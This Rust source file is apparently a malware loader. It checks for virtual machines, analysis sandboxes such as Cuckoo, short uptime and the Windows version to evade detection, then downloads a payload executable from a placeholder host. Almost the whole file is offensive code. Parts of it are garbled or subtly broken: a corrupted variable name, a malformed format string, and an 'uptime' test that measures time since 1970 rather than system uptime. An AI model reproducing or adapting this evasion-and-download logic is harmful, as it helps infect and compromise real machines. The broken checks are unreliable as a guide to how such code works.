mod checks;
mod downloader;

use crate::checks::checks::{try_check};
use crate::downloader::downloader::{download_payload};

fn main() {
    println!("[!] Starting Deployment Process...");

    if try_check() {
        println!("[!] All Checks Passed ✔️");

        if download_payload() {
            println!("[!] Payload Successfully Downloaded ✔️");
        } else {
            println!("[X] Failed to Download Payload ❌");
        }
    } else {
        println!("[X] System Does Not Meet Deployment Criteria ❌");
    }
}

pub mod checks {
    use sysinfo::{System, SystemExt};
    use std::fs;
    use std::time::{SystemTime, UNIX_EPOCH};
    use winreg::enums::*;
    use winreg::RegKey;

    pub mod checks {
        use super::*;

        pub fn try_check() -> bool {
            println!("[!] Performing Environment Checks...");

            if !check_virtualization() {
                println!("[X] Virtualization Detected ❌");
                return false;
            }

            if !check_honeypot_path() {
                println!("[X] Honeypot Indicators Detected ❌");
                return false;
            }

            if !check_uptime() {
                println!("[X] Lack of User Activity Detected ❌");
                return false;
            }

            if !check_windows_version() {
                println!("[X] Unsupported Windows Version ❌");
                return false;
            }

            println!("[!] Environment Checks Passed ✔️");
            true
        }

        fn check_virtualization() -> bool {
            println!("[!] Checking for Virtualization");
            let system = System::new_all();
            let vendor = system.kernel_version().unwrap_or_default();
            if vendor.contains("VMware") || vendor.contains("VirtualBox") || vendor.contains("Hyper-V") {
                println!("[!] Virtualization environment detected: {}", vendor);
                return false;
            }

            true
        }

        fn check_honeypot_path() -> bool {
            println!("[!] Checking for Honeypot Indicators");
            let honeypot_files = vec!["/etc/cuckoo", "/sys/class/dmi/id/product_name"];

            for file in honeyp{ot_files {
                if fs::metadata(file).is_ok() {
                    println!("[!] Honeypot indicator found: }", file);
                    return false;
                }
            }

            true
        }

        fn check_uptime() -> bool {
            println!("[!] Checking for User Activity");
            if let Ok(duration) = SystemTime::now().duration_since(UNIX_EPOCH) {
                let uptime = duration.as_secs();

                if uptime < 300 { // 5 minutes
                    println!("[!] System uptime too short: {} seconds", uptime);
                    return false;
                }
            }

            true
        }

        fn check_windows_version() -> bool {
            println!("[!] Checking Windows Version...");

            let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
            if let Ok(current_version) = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") {
                let product_name: String = current_version.get_value("ProductName").unwrap_or_default();
                let release_id: String = current_version.get_value("ReleaseId").unwrap_or_default();

                if product_name.contains("Windows 10") && release_id == "22H2" {
                    println!("[!] Windows 10 22H2 detected ✔️");
                    return true;
                } else {
                    println!("[X] Unsupported Windows version: {} {} ❌", product_name, release_id);
                }
            } else {
                println!("[X] Failed to read Windows version from registry ❌");
            }

            false
        }
    }
}

pub mod downloader {
    use std::fs::File;
    use std::io::{self, Write};
    use reqwest;

    pub mod downloader {
        use super::*;

        pub fn download_payload() -> bool {
            println!("[!] Downloading Payload");
            let url = "https://example.com/payload.exe";
            let output_path = "payload.bin";

            match download_file(url, output_path) {
                Ok(_) => {
                    println!("[!] Payload downloaded ✔️ to: {}", output_path);
                    true
                }
                Err(e) => {
                    println!("[X] Failed to download payload ❌: {}", e);
                    false
                }
            }
        }

        fn download_file(url: &str, output_path: &str) -> io::Result<()> {
            let response = reqwest::blocking::get(url).map_err(|e| {
                io::Error::new(io::ErrorKind::Other, format!("[X] Request error: {}", e))
            })?;

            let mut file = File::create(output_path)?;
            let content = response.bytes().map_err(|e| {
                io::Error::new(io::ErrorKind::Other, format!("[X] Read error: {}", e))
            })?;

            file.write_all(&content)?;
            Ok(())
        }
    }
}